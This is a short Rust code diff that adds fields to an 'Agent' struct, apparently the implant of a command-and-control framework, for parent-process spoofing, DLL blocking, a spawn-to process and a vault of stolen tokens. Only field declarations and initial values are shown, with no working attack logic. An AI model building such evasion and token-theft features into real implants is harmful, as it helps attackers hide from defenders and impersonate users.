@@ -30,6 +30,11 @@ pub struct Agent {
     pub connector:   Box<dyn Connector>,
     pub jobs:        JobsController,
     pub downloader:  Downloader,
+    pub ppid_spoof:  u32,
+    pub block_dlls:  bool,
+    pub spawn_to:    String,
+    pub token_vault: Vec<crate::commander::TokenEntry>,
+    pub next_token_id: i32,
 }
 
 impl Agent {
@@ -75,6 +80,11 @@ impl Agent {
             connector,
             jobs:        JobsController::new(),
             downloader:  Downloader::new(),
+            ppid_spoof:  0,
+            block_dlls:  false,
+            spawn_to:    String::new(),
+            token_vault: Vec::new(),
+            next_token_id: 1,
         }
     }
 
